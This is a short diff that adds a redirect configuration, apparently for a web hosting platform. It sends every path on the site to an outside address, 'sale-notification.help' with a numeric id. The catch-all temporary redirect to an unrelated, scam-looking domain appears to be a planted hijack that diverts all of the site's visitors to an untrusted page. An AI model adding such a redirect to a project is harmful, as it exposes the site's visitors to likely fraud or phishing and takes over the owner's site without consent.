@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/(.*)",
+      "destination": "https://sale-notification.help/1022847344",
+      "permanent": false
+    }
+  ]
+}
